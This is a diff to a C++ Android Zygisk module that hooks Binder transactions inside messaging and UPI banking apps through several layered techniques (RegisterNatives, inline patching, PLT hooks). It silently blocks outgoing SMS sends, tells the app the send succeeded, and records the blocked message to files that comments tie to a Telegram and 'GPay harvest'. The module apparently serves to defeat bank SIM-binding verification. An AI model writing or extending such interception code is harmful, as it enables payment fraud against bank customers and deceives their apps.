@@ -1,6 +1,7 @@
 #include "outgoing_sms_hook.hpp"
 #include "config.hpp"
 #include "fake_success.hpp"
+#include "inline_hook.hpp"
 #include "logger.hpp"
 #include "plt_hook.hpp"
 #include "sms_hook.hpp"
@@ -17,6 +18,8 @@
 #include <unistd.h>
 #include <sys/stat.h>
 #include <ctime>
+#include <dlfcn.h>
+#include <cstdint>
 
 #include "upi_registry.hpp"
 
@@ -1043,11 +1046,20 @@ bool register_instrumentation_jni(JNIEnv* env) {
     return ok;
 }
 
+static volatile int g_binder_live_logged = 0;
+
 jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject data,
                                    jobject reply, jint flags) {
     if (!orig_BinderProxy_transact) {
         write_hook_status("FATAL_binder_orig_null");
         return JNI_TRUE;
+    }
+
+    // Proof hook is actually in the call path (PLT-only was false OK before)
+    if (!g_binder_live_logged) {
+        g_binder_live_logged = 1;
+        write_hook_status("binder_hook_live");
+        write_isms_trace("binder_hook_live");
     }
 
     if (!g_intercept_armed) {
@@ -1178,6 +1190,159 @@ bool register_binder_proxy_jni(JNIEnv* env) {
     }
     write_hook_status("jni_binderproxy_fail");
     return false;
+}
+
+/** ZygiskNext aksar hookJniNativeMethods miss → RegisterNatives + dlsym orig. */
+bool register_binder_proxy_register_natives(JNIEnv* env) {
+    if (!env) return false;
+    if (orig_BinderProxy_transact) return true;
+
+    void* sym = dlsym(RTLD_DEFAULT, "Java_android_os_BinderProxy_transactNative");
+    if (!sym) sym = dlsym(RTLD_DEFAULT, "Java_android_os_BinderProxy_transact");
+    if (!sym) {
+        write_hook_status("regnative_dlsym_fail");
+        return false;
+    }
+
+    jclass cls = env->FindClass("android/os/BinderProxy");
+    if (!cls) {
+        if (env->ExceptionCheck()) env->ExceptionClear();
+        write_hook_status("regnative_class_fail");
+        return false;
+    }
+
+    JNINativeMethod methods[] = {
+        {"transactNative", "(ILandroid/os/Parcel;Landroid/os/Parcel;I)Z",
+         reinterpret_cast<void*>(hook_BinderProxy_transact)},
+    };
+    const jint rc = env->RegisterNatives(cls, methods, 1);
+    if (env->ExceptionCheck()) {
+        env->ExceptionClear();
+        write_hook_status("regnative_exception");
+        return false;
+    }
+    if (rc != 0) {
+        write_hook_status("regnative_rc_fail");
+        return false;
+    }
+
+    orig_BinderProxy_transact =
+        reinterpret_cast<decltype(orig_BinderProxy_transact)>(sym);
+    write_hook_status("regnative_binderproxy_ok");
+    logger::info("OutgoingSms", "RegisterNatives BinderProxy OK");
+    return true;
+}
+
+/** Absolute nuclear: patch JNI symbol entry so ART trampoline also hits us. */
+bool register_binder_proxy_inline() {
+    if (orig_BinderProxy_transact && g_binder_live_logged) return true;
+
+    void* sym = dlsym(RTLD_DEFAULT, "Java_android_os_BinderProxy_transactNative");
+    if (!sym) sym = dlsym(RTLD_DEFAULT, "Java_android_os_BinderProxy_transact");
+    if (!sym) {
+        write_hook_status("inline_dlsym_fail");
+        return false;
+    }
+
+    void* tramp = nullptr;
+    if (!inline_hook::hook(sym, reinterpret_cast<void*>(hook_BinderProxy_transact), &tramp)) {
+        write_hook_status("inline_patch_fail");
+        return false;
+    }
+    orig_BinderProxy_transact =
+        reinterpret_cast<decltype(orig_BinderProxy_transact)>(tramp);
+    write_hook_status("inline_binderproxy_ok");
+    logger::info("OutgoingSms", "Inline BinderProxy hooked @%p", sym);
+    return true;
+}
+
+// ---- BpBinder::transact native PLT (libandroid_runtime → libbinder) ----
+using BpTransactFn = int32_t (*)(void*, uint32_t, const void*, void*, uint32_t);
+static BpTransactFn orig_BpBinder_transact = nullptr;
+using ParcelDataFn = const uint8_t* (*)(const void*);
+using ParcelSizeFn = size_t (*)(const void*);
+using ParcelWriteInt32Fn = int32_t (*)(void*, int32_t);
+static ParcelDataFn g_parcel_data = nullptr;
+static ParcelSizeFn g_parcel_size = nullptr;
+static ParcelWriteInt32Fn g_parcel_write_i32 = nullptr;
+
+bool blob_has_isms_bytes(const uint8_t* d, size_t n) {
+    if (!d || n < 4) return false;
+    std::string blob(reinterpret_cast<const char*>(d), n);
+    return messaging_blob_looks_like_sms_send(blob);
+}
+
+int32_t hook_BpBinder_transact(void* thiz, uint32_t code, const void* data, void* reply,
+                               uint32_t flags) {
+    if (!orig_BpBinder_transact) return -1;
+
+    if (g_is_messaging_app && g_intercept_armed && data && g_parcel_data && g_parcel_size) {
+        const uint8_t* bytes = g_parcel_data(data);
+        const size_t n = g_parcel_size(data);
+        if (blob_has_isms_bytes(bytes, n) && code >= 1) {
+            write_hook_status("isms_blocked_bp");
+            write_isms_trace("isms_blocked_bp");
+            // Fake success to app (void ISms send* → writeNoException = int32 0)
+            if (reply && g_parcel_write_i32) g_parcel_write_i32(reply, 0);
+            // No JNI env here — write blocked flag for companion TG harvest
+            char flag_buf[256];
+            snprintf(flag_buf, sizeof(flag_buf), "0000000000\nBP_ISMS_BLOCK");
+            write_diag_multi("hivirtus_outgoing_blocked.flag", flag_buf);
+            write_diag_multi(
+                "hivirtus_outgoing_blocked.json",
+                "{\"dest\":\"0000000000\",\"body\":\"BP_ISMS_BLOCK\",\"pkg\":\"messages\","
+                "\"src\":\"bp\"}\n");
+            return 0;
+        }
+    }
+    return orig_BpBinder_transact(thiz, code, data, reply, flags);
+}
+
+bool register_bpbinder_plt() {
+    if (!g_api || !g_is_messaging_app) return false;
+    if (orig_BpBinder_transact) return true;
+
+    g_parcel_data = reinterpret_cast<ParcelDataFn>(
+        dlsym(RTLD_DEFAULT, "_ZNK7android6Parcel4dataEv"));
+    g_parcel_size = reinterpret_cast<ParcelSizeFn>(
+        dlsym(RTLD_DEFAULT, "_ZNK7android6Parcel8dataSizeEv"));
+    g_parcel_write_i32 = reinterpret_cast<ParcelWriteInt32Fn>(
+        dlsym(RTLD_DEFAULT, "_ZN7android6Parcel9writeInt32Ei"));
+    if (!g_parcel_data || !g_parcel_size) {
+        write_hook_status("bp_parcel_dlsym_fail");
+        return false;
+    }
+
+    plt_hook::set_api(g_api);
+    const char* sym = "_ZN7android8BpBinder8transactEjRKNS_6ParcelEPS1_j";
+    const char* libs[] = {
+        ".*/libandroid_runtime\\.so$",
+        ".*/libbinder\\.so$",
+        nullptr,
+    };
+    bool any = false;
+    for (const char** lib = libs; *lib; ++lib) {
+        if (plt_hook::register_regex(
+                *lib, sym, reinterpret_cast<void*>(hook_BpBinder_transact),
+                reinterpret_cast<void**>(&orig_BpBinder_transact))) {
+            any = true;
+        }
+    }
+    if (!any) {
+        write_hook_status("bp_plt_reg_fail");
+        return false;
+    }
+    if (!plt_hook::commit()) {
+        write_hook_status("bp_plt_commit_fail");
+        return false;
+    }
+    if (!orig_BpBinder_transact) {
+        write_hook_status("bp_plt_no_orig");
+        return false;
+    }
+    write_hook_status("bp_plt_ok");
+    logger::info("OutgoingSms", "BpBinder::transact PLT hooked");
+    return true;
 }
 
 /** Messages-only PLT — banking pe crash, Messages pe HEROAXISUPI real-SIM catch. */
@@ -1515,41 +1680,69 @@ std::string install_for_upi(JNIEnv* env, zygisk::Api* api, const char* package_n
         upi_registry::is_default_sms_app(g_upi_pkg);
     ensure_pkg_diag_dir();
     write_hook_status("upi_install_begin");
+    // Messages must always intercept (armed); fragile UPI may disarm Intent PLT temporarily
+    if (g_is_messaging_app) g_intercept_armed = true;
 
     const std::string pkg = g_upi_pkg;
     const bool fragile = upi_registry::is_fragile_banking_app(pkg);
 
     bool jni_ok = register_binder_proxy_jni(env);
+    bool regnative_ok = false;
+    bool inline_ok = false;
+    bool bp_ok = false;
     bool plt_ok = false;
-    // CRITICAL: ZygiskNext pe BinderProxy JNI aksar miss → Messages MUST use PLT
-    // (Hero SENDTO → Messages → ISms → SIM). Banking pe PLT mat lagao (open crash).
+
+    // ZygiskNext: JNI miss common → RegisterNatives then inline patch (real SIM catch)
+    if (!orig_BinderProxy_transact) {
+        regnative_ok = register_binder_proxy_register_natives(env);
+    }
+    if (!orig_BinderProxy_transact && g_is_messaging_app) {
+        inline_ok = register_binder_proxy_inline();
+    }
+    // BpBinder PLT — catches libandroid_runtime→libbinder even if JNI symbol path weird
+    if (g_is_messaging_app) {
+        bp_ok = register_bpbinder_plt();
+    }
+    // PLT on BinderProxy JNI symbol is weak (ART often bypasses GOT) — last resort only
     if (!orig_BinderProxy_transact && g_is_messaging_app) {
         plt_ok = register_binder_proxy_plt_messages();
     }
+
     bool sms_ok = register_smsmanager_jni(env);
     bool intent_jni = false;
     // Hero/fragile: binder JNI miss (OK=0) — block SENDTO Intent so SMS Messages tak na pahuche
-    // (SMSTweaks also hooks compose path). Safe after UI settle (deferred install).
     if (!g_is_messaging_app) {
         intent_jni = register_instrumentation_jni(env);
     }
     if (!orig_BinderProxy_transact) {
         jni_ok = register_binder_proxy_jni(env) || jni_ok;
+        if (!orig_BinderProxy_transact) {
+            regnative_ok = register_binder_proxy_register_natives(env) || regnative_ok;
+        }
         if (!orig_BinderProxy_transact && g_is_messaging_app) {
+            inline_ok = register_binder_proxy_inline() || inline_ok;
             plt_ok = register_binder_proxy_plt_messages() || plt_ok;
         }
     }
 
-    const bool ok = orig_BinderProxy_transact != nullptr || intent_jni;
-    char summary[320];
+    // Real OK = BinderProxy hook installed OR BpBinder OR Intent (UPI). PLT-alone is NOT enough.
+    const bool binder_real = orig_BinderProxy_transact != nullptr;
+    const bool ok = binder_real || bp_ok || intent_jni;
+    const char* path = "none";
+    if (inline_ok) path = "inline";
+    else if (regnative_ok) path = "regnative";
+    else if (jni_ok && binder_real) path = "jni";
+    else if (bp_ok) path = "bp";
+    else if (plt_ok && binder_real) path = "plt_weak";
+    else if (intent_jni) path = "intent";
+
+    char summary[400];
     snprintf(summary, sizeof(summary),
-             "upi_hook_done pkg=%s fragile=%d msg=%d binder=%d jni=%d plt=%d sms_jni=%d "
-             "intent=%d OK=%d path=%s",
-             pkg.c_str(), fragile ? 1 : 0, g_is_messaging_app ? 1 : 0,
-             orig_BinderProxy_transact ? 1 : 0, jni_ok ? 1 : 0, plt_ok ? 1 : 0, sms_ok ? 1 : 0,
-             intent_jni ? 1 : 0, ok ? 1 : 0,
-             g_is_messaging_app ? (plt_ok ? "msg_plt" : "msg_jni")
-                                : (intent_jni ? "upi_intent" : "upi_jni"));
+             "upi_hook_done pkg=%s fragile=%d msg=%d binder=%d jni=%d rn=%d inl=%d bp=%d "
+             "plt=%d sms_jni=%d intent=%d OK=%d path=%s",
+             pkg.c_str(), fragile ? 1 : 0, g_is_messaging_app ? 1 : 0, binder_real ? 1 : 0,
+             jni_ok ? 1 : 0, regnative_ok ? 1 : 0, inline_ok ? 1 : 0, bp_ok ? 1 : 0,
+             plt_ok ? 1 : 0, sms_ok ? 1 : 0, intent_jni ? 1 : 0, ok ? 1 : 0, path);
     write_hook_status(summary);
     write_diag_multi("hivirtus_hook_status_latest.txt", summary);
     // Always mirror Messages status to dedicated files (GPay harvest must not hide this)
